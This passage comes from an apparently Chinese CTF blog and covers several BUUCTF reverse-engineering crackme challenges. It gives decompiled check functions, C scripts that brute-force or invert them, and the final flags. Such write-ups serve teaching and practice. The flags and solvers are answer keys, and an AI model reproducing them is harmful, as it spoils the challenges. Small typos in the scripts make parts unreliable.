class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br></pre></td><td class="code"><pre><span class="line">int func()</span><br><span class="line">&#123;</span><br><span class="line">  int result; &#x2F;&#x2F; eax</span><br><span class="line">  int v1; &#x2F;&#x2F; [esp+14h] [ebp-44h]</span><br><span class="line">  int v2; &#x2F;&#x2F; [esp+18h] [ebp-40h]</span><br><span class="line">  int v3; &#x2F;&#x2F; [esp+1Ch] [ebp-3Ch]</span><br><span class="line">  int v4; &#x2F;&#x2F; [esp+20h] [ebp-38h]</span><br><span class="line">  unsigned __int8 v5; &#x2F;&#x2F; [esp+24h] [ebp-34h]</span><br><span class="line">  unsigned __int8 v6; &#x2F;&#x2F; [esp+25h] [ebp-33h]</span><br><span class="line">  unsigned __int8 v7; &#x2F;&#x2F; [esp+26h] [ebp-32h]</span><br><span class="line">  unsigned __int8 v8; &#x2F;&#x2F; [esp+27h] [ebp-31h]</span><br><span class="line">  unsigned __int8 v9; &#x2F;&#x2F; [esp+28h] [ebp-30h]</span><br><span class="line">  int v10; &#x2F;&#x2F; [esp+29h] [ebp-2Fh]</span><br><span class="line">  int v11; &#x2F;&#x2F; [esp+2Dh] [ebp-2Bh]</span><br><span class="line">  int v12; &#x2F;&#x2F; [esp+31h] [ebp-27h]</span><br><span class="line">  int v13; &#x2F;&#x2F; [esp+35h] [ebp-23h]</span><br><span class="line">  unsigned __int8 v14; &#x2F;&#x2F; [esp+39h] [ebp-1Fh]</span><br><span class="line">  char v15; &#x2F;&#x2F; [esp+3Bh] [ebp-1Dh]</span><br><span class="line">  char v16; &#x2F;&#x2F; [esp+3Ch] [ebp-1Ch]</span><br><span class="line">  char v17; &#x2F;&#x2F; [esp+3Dh] [ebp-1Bh]</span><br><span class="line">  char v18; &#x2F;&#x2F; [esp+3Eh] [ebp-1Ah]</span><br><span class="line">  char v19; &#x2F;&#x2F; [esp+3Fh] [ebp-19h]</span><br><span class="line">  char v20; &#x2F;&#x2F; [esp+40h] [ebp-18h]</span><br><span class="line">  char v21; &#x2F;&#x2F; [esp+41h] [ebp-17h]</span><br><span class="line">  char v22; &#x2F;&#x2F; [esp+42h] [ebp-16h]</span><br><span class="line">  char v23; &#x2F;&#x2F; [esp+43h] [ebp-15h]</span><br><span class="line">  char v24; &#x2F;&#x2F; [esp+44h] [ebp-14h]</span><br><span class="line">  char v25; &#x2F;&#x2F; [esp+45h] [ebp-13h]</span><br><span class="line">  char v26; &#x2F;&#x2F; [esp+46h] [ebp-12h]</span><br><span class="line">  char v27; &#x2F;&#x2F; [esp+47h] [ebp-11h]</span><br><span class="line">  char v28; &#x2F;&#x2F; [esp+48h] [ebp-10h]</span><br><span class="line">  char v29; &#x2F;&#x2F; [esp+49h] [ebp-Fh]</span><br><span class="line">  char v30; &#x2F;&#x2F; [esp+4Ah] [ebp-Eh]</span><br><span class="line">  char v31; &#x2F;&#x2F; [esp+4Bh] [ebp-Dh]</span><br><span class="line">  int i; &#x2F;&#x2F; [esp+4Ch] [ebp-Ch]</span><br><span class="line"></span><br><span class="line">  v15 &#x3D; 81;</span><br><span class="line">  v16 &#x3D; 115;</span><br><span class="line">  v17 &#x3D; 119;</span><br><span class="line">  v18 &#x3D; 51;</span><br><span class="line">  v19 &#x3D; 115;</span><br><span class="line">  v20 &#x3D; 106;</span><br><span class="line">  v21 &#x3D; 95;</span><br><span class="line">  v22 &#x3D; 108;</span><br><span class="line">  v23 &#x3D; 122;</span><br><span class="line">  v24 &#x3D; 52;</span><br><span class="line">  v25 &#x3D; 95;</span><br><span class="line">  v26 &#x3D; 85;</span><br><span class="line">  v27 &#x3D; 106;</span><br><span class="line">  v28 &#x3D; 119;</span><br><span class="line">  v29 &#x3D; 64;</span><br><span class="line">  v30 &#x3D; 108;</span><br><span class="line">  v31 &#x3D; 0;</span><br><span class="line">  printf(&quot;Please input:&quot;);</span><br><span class="line">  scanf(&quot;%s&quot;, &amp;v5);</span><br><span class="line">  result &#x3D; v5;</span><br><span class="line">  if ( v5 &#x3D;&#x3D; &#39;A&#39; )</span><br><span class="line">  &#123;</span><br><span class="line">    result &#x3D; v6;</span><br><span class="line">    if ( v6 &#x3D;&#x3D; &#39;C&#39; )</span><br><span class="line">    &#123;</span><br><span class="line">      result &#x3D; v7;</span><br><span class="line">      if ( v7 &#x3D;&#x3D; &#39;T&#39; )</span><br><span class="line">      &#123;</span><br><span class="line">        result &#x3D; v8;</span><br><span class="line">        if ( v8 &#x3D;&#x3D; &#39;F&#39; )</span><br><span class="line">        &#123;</span><br><span class="line">          result &#x3D; v9;</span><br><span class="line">          if ( v9 &#x3D;&#x3D; &#39;&#123;&#39; )</span><br><span class="line">          &#123;</span><br><span class="line">            result &#x3D; v14;</span><br><span class="line">            if ( v14 &#x3D;&#x3D; &#39;&#125;&#39; )</span><br><span class="line">            &#123;</span><br><span class="line">              v1 &#x3D; v10;</span><br><span class="line">              v2 &#x3D; v11;</span><br><span class="line">              v3 &#x3D; v12;</span><br><span class="line">              v4 &#x3D; v13;</span><br><span class="line">              for ( i &#x3D; 0; i &lt;&#x3D; 15; ++i )</span><br><span class="line">              &#123;</span><br><span class="line">                if ( *(&amp;v1 + i) &gt; 64 &amp;&amp; *(&amp;v1 + i) &lt;&#x3D; 90 )</span><br><span class="line">                  *(&amp;v1 + i) &#x3D; (*(&amp;v1 + i) - 51) % 26 + 65;</span><br><span class="line">                if ( *(&amp;v1 + i) &gt; 96 &amp;&amp; *(&amp;v1 + i) &lt;&#x3D; 122 )</span><br><span class="line">                  *(&amp;v1 + i) &#x3D; (*(&amp;v1 + i) - 79) % 26 + 97;</span><br><span class="line">              &#125;</span><br><span class="line">              for ( i &#x3D; 0; i &lt;&#x3D; 15; ++i )</span><br><span class="line">              &#123;</span><br><span class="line">                result &#x3D; *(&amp;v15 + i);</span><br><span class="line">                if ( *(&amp;v1 + i) !&#x3D; result )</span><br><span class="line">                  return result;</span><br><span class="line">              &#125;</span><br><span class="line">              result &#x3D; printf(&quot;You are correct!&quot;);</span><br><span class="line">            &#125;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  return result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里就是你输入16个字符，经过变化和v15-v30比较，直接爆破。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">int check[16]&#x3D;&#123;81,115,119,51,115,106,95,108,122,52,95,85,106,119,64,108&#125;;</span><br><span class="line">int i,j,k;</span><br><span class="line">    for ( i &#x3D; 0; i &lt; 16; i++ )</span><br><span class="line">    &#123;</span><br><span class="line">        for(j&#x3D;0;j&lt;127;j++)</span><br><span class="line">        &#123;</span><br><span class="line">        k&#x3D;j;</span><br><span class="line">            if ( j &gt; 64 &amp;&amp; j &lt;&#x3D; 90 )</span><br><span class="line">                j &#x3D; (j - 51) % 26 + 65;</span><br><span class="line">            if ( j &gt; 96 &amp;&amp; j &lt;&#x3D; 122 )</span><br><span class="line">                j &#x3D; (j - 79) % 26 + 97;</span><br><span class="line">            if(j&#x3D;&#x3D;check[i])</span><br><span class="line">                printf(&quot;%c&quot;,k);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>flag{Cae3ar_th4_Gre@t}</p></blockquote><h1 id="re"><a href="#re" class="headerlink" title="re"></a>re</h1><p><a href="https://buuoj.cn/challenges#[GUET-CTF2019]re">题目链接</a><br>文件包有upx壳，脱掉。<br>进入main函数，然后跳至sub_4009AE，a1为flag，算出来就行，第七位没有，手动爆破。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line">_BOOL8 __fastcall sub_4009AE(char *a1)</span><br><span class="line">&#123;</span><br><span class="line">  if ( 1629056 * *a1 !&#x3D; 166163712 )</span><br><span class="line">    return 0LL;</span><br><span class="line">  if ( 6771600 * a1[1] !&#x3D; 731332800 )</span><br><span class="line">    return 0LL;</span><br><span class="line">  if ( 3682944 * a1[2] !&#x3D; 357245568 )</span><br><span class="line">    return 0LL;</span><br><span class="line">  if ( 10431000 * a1[3] !&#x3D; 1074393000 )</span><br><span class="line">    return 0LL;</span><br><span class="line">  if ( 3977328 * a1[4] !&#x3D; 489211344 )</span><br><span class="line">    return 0LL;</span><br><span class="line">  if ( 5138336 * a1[5] !&#x3D; 518971936 )</span><br><span class="line">    return 0LL;</span><br><span class="line">  if ( 7532250 * a1[7] !&#x3D; 406741500 )</span><br><span class="line">    return 0LL;</span><br><span class="line">  if ( 5551632 * a1[8] !&#x3D; 294236496 )</span><br><span class="line">    return 0LL;</span><br><span class="line">  if ( 3409728 * a1[9] !&#x3D; 177305856 )</span><br><span class="line">    return 0LL;</span><br><span class="line">  if ( 13013670 * a1[10] !&#x3D; 650683500 )</span><br><span class="line">    return 0LL;</span><br><span class="line">  if ( 6088797 * a1[11] !&#x3D; 298351053 )</span><br><span class="line">    return 0LL;</span><br><span class="line">  if ( 7884663 * a1[12] !&#x3D; 386348487 )</span><br><span class="line">    return 0LL;</span><br><span class="line">  if ( 8944053 * a1[13] !&#x3D; 438258597 )</span><br><span class="line">    return 0LL;</span><br><span class="line">  if ( 5198490 * a1[14] !&#x3D; 249527520 )</span><br><span class="line">    return 0LL;</span><br><span class="line">  if ( 4544518 * a1[15] !&#x3D; 445362764 )</span><br><span class="line">    return 0LL;</span><br><span class="line">  if ( 3645600 * a1[17] !&#x3D; 174988800 )</span><br><span class="line">    return 0LL;</span><br><span class="line">  if ( 10115280 * a1[16] !&#x3D; 981182160 )</span><br><span class="line">    return 0LL;</span><br><span class="line">  if ( 9667504 * a1[18] !&#x3D; 493042704 )</span><br><span class="line">    return 0LL;</span><br><span class="line">  if ( 5364450 * a1[19] !&#x3D; 257493600 )</span><br><span class="line">    return 0LL;</span><br><span class="line">  if ( 13464540 * a1[20] !&#x3D; 767478780 )</span><br><span class="line">    return 0LL;</span><br><span class="line">  if ( 5488432 * a1[21] !&#x3D; 312840624 )</span><br><span class="line">    return 0LL;</span><br><span class="line">  if ( 14479500 * a1[22] !&#x3D; 1404511500 )</span><br><span class="line">    return 0LL;</span><br><span class="line">  if ( 6451830 * a1[23] !&#x3D; 316139670 )</span><br><span class="line">    return 0LL;</span><br><span class="line">  if ( 6252576 * a1[24] !&#x3D; 619005024 )</span><br><span class="line">    return 0LL;</span><br><span class="line">  if ( 7763364 * a1[25] !&#x3D; 372641472 )</span><br><span class="line">    return 0LL;</span><br><span class="line">  if ( 7327320 * a1[26] !&#x3D; 373693320 )</span><br><span class="line">    return 0LL;</span><br><span class="line">  if ( 8741520 * a1[27] !&#x3D; 498266640 )</span><br><span class="line">    return 0LL;</span><br><span class="line">  if ( 8871876 * a1[28] !&#x3D; 452465676 )</span><br><span class="line">    return 0LL;</span><br><span class="line">  if ( 4086720 * a1[29] !&#x3D; 208422720 )</span><br><span class="line">    return 0LL;</span><br><span class="line">  if ( 9374400 * a1[30] &#x3D;&#x3D; 515592000 )</span><br><span class="line">    return 5759124 * a1[31] &#x3D;&#x3D; 719890500;</span><br><span class="line">  return 0LL;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>flag{e165421110ba03099a1c039337}</p></blockquote><h1 id="level1"><a href="#level1" class="headerlink" title="level1"></a>level1</h1><p><a href="https://buuoj.cn/challenges#[WUSTCTF2020]level1">题目链接</a><br>ida64打开<br>找到main函数，这里逻辑很清晰，直接上脚本。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">int a1[19]&#x3D;&#123;198,232,816,200,1536,300,6144,984,51200,570,92160,1200,565248,756,1474560,800</span><br><span class="line">    6291456,1782,65536000&#125;;</span><br><span class="line">int i;</span><br><span class="line">for(i&#x3D;0;i&lt;19;i++)</span><br><span class="line">&#123;</span><br><span class="line">if ( (i+1) &amp; 1 )</span><br><span class="line">            printf(&quot;%c&quot;, (a1[i] &gt;&gt; (i+1) ) );</span><br><span class="line">        else</span><br><span class="line">            printf(&quot;%c&quot;, (a1[i]&#x2F;(i+1) ) );</span><br><span class="line">&#125;</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>flag{d9-dE6-20c}</p></blockquote><h1 id="xxor"><a href="#xxor" class="headerlink" title="xxor"></a>xxor</h1><p>ida64打开<br>进入main函数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall main(__int64 a1, char **a2, char **a3)</span><br><span class="line">&#123;</span><br><span class="line">  signed int i; &#x2F;&#x2F; [rsp+8h] [rbp-68h]</span><br><span class="line">  signed int j; &#x2F;&#x2F; [rsp+Ch] [rbp-64h]</span><br><span class="line">  __int64 v6; &#x2F;&#x2F; [rsp+10h] [rbp-60h]</span><br><span class="line">  __int64 v7; &#x2F;&#x2F; [rsp+18h] [rbp-58h]</span><br><span class="line">  __int64 v8; &#x2F;&#x2F; [rsp+20h] [rbp-50h]</span><br><span class="line">  __int64 v9; &#x2F;&#x2F; [rsp+28h] [rbp-48h]</span><br><span class="line">  __int64 v10; &#x2F;&#x2F; [rsp+30h] [rbp-40h]</span><br><span class="line">  __int64 v11; &#x2F;&#x2F; [rsp+40h] [rbp-30h]</span><br><span class="line">  __int64 v12; &#x2F;&#x2F; [rsp+48h] [rbp-28h]</span><br><span class="line">  __int64 v13; &#x2F;&#x2F; [rsp+50h] [rbp-20h]</span><br><span class="line">  __int64 v14; &#x2F;&#x2F; [rsp+58h] [rbp-18h]</span><br><span class="line">  __int64 v15; &#x2F;&#x2F; [rsp+60h] [rbp-10h]</span><br><span class="line">  unsigned __int64 v16; &#x2F;&#x2F; [rsp+68h] [rbp-8h]</span><br><span class="line"></span><br><span class="line">  v16 &#x3D; __readfsqword(0x28u);</span><br><span class="line">  puts(&quot;Let us play a game?&quot;);</span><br><span class="line">  puts(&quot;you have six chances to input&quot;);</span><br><span class="line">  puts(&quot;Come on!&quot;);</span><br><span class="line">  v6 &#x3D; 0LL;</span><br><span class="line">  v7 &#x3D; 0LL;</span><br><span class="line">  v8 &#x3D; 0LL;</span><br><span class="line">  v9 &#x3D; 0LL;</span><br><span class="line">  v10 &#x3D; 0LL;</span><br><span class="line">  for ( i &#x3D; 0; i &lt;&#x3D; 5; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    printf(&quot;%s&quot;, &quot;input: &quot;, i);</span><br><span class="line">    __isoc99_scanf(&quot;%d&quot;, &amp;v6 + 4 * i);</span><br><span class="line">  &#125;</span><br><span class="line">  v11 &#x3D; 0LL;</span><br><span class="line">  v12 &#x3D; 0LL;</span><br><span class="line">  v13 &#x3D; 0LL;</span><br><span class="line">  v14 &#x3D; 0LL;</span><br><span class="line">  v15 &#x3D; 0LL;</span><br><span class="line">  for ( j &#x3D; 0; j &lt;&#x3D; 4; j +&#x3D; 2 )</span><br><span class="line">  &#123;</span><br><span class="line">    dword_601078 &#x3D; *(&amp;v6 + j);</span><br><span class="line">    dword_60107C &#x3D; *(&amp;v6 + j + 1);</span><br><span class="line">    sub_400686(&amp;dword_601078, &amp;unk_601060);</span><br><span class="line">    *(&amp;v11 + j) &#x3D; dword_601078;</span><br><span class="line">    *(&amp;v11 + j + 1) &#x3D; dword_60107C;</span><br><span class="line">  &#125;</span><br><span class="line">  if ( sub_400770(&amp;v11) !&#x3D; 1 )</span><br><span class="line">  &#123;</span><br><span class="line">    puts(&quot;NO NO NO~ &quot;);</span><br><span class="line">    exit(0);</span><br><span class="line">  &#125;</span><br><span class="line">  puts(&quot;Congratulation!\n&quot;);</span><br><span class="line">  puts(&quot;You seccess half\n&quot;);</span><br><span class="line">  puts(&quot;Do not forget to change input to hex and combine~\n&quot;);</span><br><span class="line">  puts(&quot;ByeBye&quot;);</span><br><span class="line">  return 0LL;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这道题分为两步，我们从下往上分析。</p><h2 id="sub-400770"><a href="#sub-400770" class="headerlink" title="sub_400770"></a>sub_400770</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">signed __int64 __fastcall sub_400770(_DWORD *a1)</span><br><span class="line">&#123;</span><br><span class="line">  signed __int64 result; &#x2F;&#x2F; rax</span><br><span class="line"></span><br><span class="line">  if ( a1[2] - a1[3] !&#x3D; 2225223423LL || a1[3] + a1[4] !&#x3D; 4201428739LL || a1[2] - a1[4] !&#x3D; </span><br><span class="line">    1121399208LL )</span><br><span class="line">  &#123;</span><br><span class="line">    puts(&quot;Wrong!&quot;);</span><br><span class="line">    result &#x3D; 0LL;</span><br><span class="line">  &#125;</span><br><span class="line">  else if ( *a1 !&#x3D; -548868226 || a1[5] !&#x3D; -2064448480 || a1[1] !&#x3D; 550153460 )</span><br><span class="line">  &#123;</span><br><span class="line">    puts(&quot;Wrong!&quot;);</span><br><span class="line">    result &#x3D; 0LL;</span><br><span class="line">  &#125;</span><br><span class="line">  else</span><br><span class="line">  &#123;</span><br><span class="line">    puts(&quot;good!&quot;);</span><br><span class="line">    result &#x3D; 1LL;</span><br><span class="line">  &#125;</span><br><span class="line">  return result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个函数简单，计算方程组就行。</p><blockquote><p>a1[2] - a1[3] == 2225223423<br>a1[3] + a1[4] == 4201428739<br>a1[2] - a1[4] == 1121399208<br>结果：a1[2]3774025685  a1[3]=1548802262  a1[4]=2652626477</p></blockquote><h2 id="sub-400686"><a href="#sub-400686" class="headerlink" title="sub_400686"></a>sub_400686</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall sub_400686(unsigned int *a1, _DWORD *a2)</span><br><span class="line">&#123;</span><br><span class="line">  __int64 result; &#x2F;&#x2F; rax</span><br><span class="line">  unsigned int v3; &#x2F;&#x2F; [rsp+1Ch] [rbp-24h]</span><br><span class="line">  unsigned int v4; &#x2F;&#x2F; [rsp+20h] [rbp-20h]</span><br><span class="line">  int v5; &#x2F;&#x2F; [rsp+24h] [rbp-1Ch]</span><br><span class="line">  unsigned int i; &#x2F;&#x2F; [rsp+28h] [rbp-18h]</span><br><span class="line"></span><br><span class="line">  v3 &#x3D; *a1;</span><br><span class="line">  v4 &#x3D; a1[1];</span><br><span class="line">  v5 &#x3D; 0;</span><br><span class="line">  for ( i &#x3D; 0; i &lt;&#x3D; 0x3F; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    v5 +&#x3D; 1166789954;</span><br><span class="line">    v3 +&#x3D; (v4 + v5 + 11) ^ ((v4 &lt;&lt; 6) + *a2) ^ ((v4 &gt;&gt; 9) + a2[1]) ^ 0x20;</span><br><span class="line">    v4 +&#x3D; (v3 + v5 + 20) ^ ((v3 &lt;&lt; 6) + a2[2]) ^ ((v3 &gt;&gt; 9) + a2[3]) ^ 0x10;</span><br><span class="line">  &#125;</span><br><span class="line">  *a1 &#x3D; v3;</span><br><span class="line">  result &#x3D; v4;</span><br><span class="line">  a1[1] &#x3D; v4;</span><br><span class="line">  return result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>a1为flag，a[2]={2,2,3,4}<br>这个函数就是进行异或操作，我们将它逆过来。<br>脚本：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">    unsigned int a[6]&#x3D;&#123;3746099070,550153460,3774025685,1548802262,2652626477,2230518816 &#125;;</span><br><span class="line">    unsigned int b[4]&#x3D;&#123;2,2,3,4&#125;;</span><br><span class="line">    unsigned int v3, v4,v5;</span><br><span class="line">    int i;</span><br><span class="line">    for ( i &#x3D; 0; i &lt;&#x3D; 4; i +&#x3D; 2)</span><br><span class="line">    &#123;</span><br><span class="line">        v3 &#x3D; a[i];</span><br><span class="line">        v4 &#x3D; a[i + 1];</span><br><span class="line">        v5 &#x3D; 1166789954*0x40;</span><br><span class="line">        for (int i &#x3D; 0; i &lt;&#x3D; 0x3F; ++i) &#123;</span><br><span class="line">            v4 -&#x3D; (v3 + v5 + 20) ^ ((v3 &lt;&lt; 6) + b[2]) ^ ((v3 &gt;&gt; 9) + b[3]) ^ 0x10;</span><br><span class="line">            v3 -&#x3D; (v4 + v5 + 11) ^ ((v4 &lt;&lt; 6) + b[0]) ^ ((v4 &gt;&gt; 9) + b[1]) ^ 0x20;</span><br><span class="line">            v5 -&#x3D; 1166789954;</span><br><span class="line">        &#125;</span><br><span class="line">        a[i] &#x3D; v3;</span><br><span class="line">        a[i + 1] &#x3D; v4;</span><br><span class="line">    &#125;</span><br><span class="line">    for (i&#x3D;0;i&lt;6;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        printf(&quot;%0x&quot;,a[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>输出的十六进制再转为字符串。</p><blockquote><p>flag{re_is_great!}</p></blockquote><h1 id="Challenge1"><a href="#Challenge1" class="headerlink" title="Challenge1"></a>Challenge1</h1><p>ida32打开，进入main函数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">int __cdecl main(int argc, const char **argv, const char **envp)</span><br><span class="line">&#123;</span><br><span class="line">  char Buffer; &#x2F;&#x2F; [esp+0h] [ebp-94h]</span><br><span class="line">  char *v5; &#x2F;&#x2F; [esp+80h] [ebp-14h]</span><br><span class="line">  char *v6; &#x2F;&#x2F; [esp+84h] [ebp-10h]</span><br><span class="line">  HANDLE v7; &#x2F;&#x2F; [esp+88h] [ebp-Ch]</span><br><span class="line">  HANDLE hFile; &#x2F;&#x2F; [esp+8Ch] [ebp-8h]</span><br><span class="line">  DWORD NumberOfBytesWritten; &#x2F;&#x2F; [esp+90h] [ebp-4h]</span><br><span class="line"></span><br><span class="line">  hFile &#x3D; GetStdHandle(0xFFFFFFF5);</span><br><span class="line">  v7 &#x3D; GetStdHandle(0xFFFFFFF6);</span><br><span class="line">  v6 &#x3D; &quot;x2dtJEOmyjacxDemx2eczT5cVS9fVUGvWTuZWjuexjRqy24rV29q&quot;;</span><br><span class="line">  WriteFile(hFile, &quot;Enter password:\r\n&quot;, 0x12u, &amp;NumberOfBytesWritten, 0);</span><br><span class="line">  ReadFile(v7, &amp;Buffer, 0x80u, &amp;NumberOfBytesWritten, 0);</span><br><span class="line">  v5 &#x3D; sub_401260(&amp;Buffer, NumberOfBytesWritten - 2);</span><br><span class="line">  if ( !strcmp(v5, v6) )</span><br><span class="line">    WriteFile(hFile, &quot;Correct!\r\n&quot;, 0xBu, &amp;NumberOfBytesWritten, 0);</span><br><span class="line">  else</span><br><span class="line">    WriteFile(hFile, &quot;Wrong password\r\n&quot;, 0x11u, &amp;NumberOfBytesWritten, 0);</span><br><span class="line">  return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>进入第15行</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span 